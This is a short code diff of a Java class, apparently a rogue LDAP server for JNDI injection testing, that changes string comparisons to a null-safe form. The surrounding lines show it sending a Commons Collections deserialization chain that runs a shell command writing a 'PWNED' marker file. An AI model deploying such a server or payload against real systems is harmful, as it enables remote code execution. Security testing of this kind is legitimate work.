@@ -122,7 +122,7 @@ public  class  Server  {
             throws LDAPException, MalformedURLException
         {
             System.out.println("Base = " + base);
-           if (base.equals("Commons") || base.equals("Commons2")) {
+           if ("Commons".equals(base) || "Commons2".equals(base)) {
                 //deserialization attack chain in commons collections
                 System.out.println("Send LDAP reference result for " + base + " containing a deserialized chain");
 
@@ -131,7 +131,7 @@ public  class  Server  {
                         "-c",
                         "echo PWNED > /tmp/pwned-commons"};
 
-                if (base.equals("Commons2")) {
+                if ("Commons2".equals(base)) {
                     String[] containerCommand = {
                             "/bin/sh",
                             "-c",
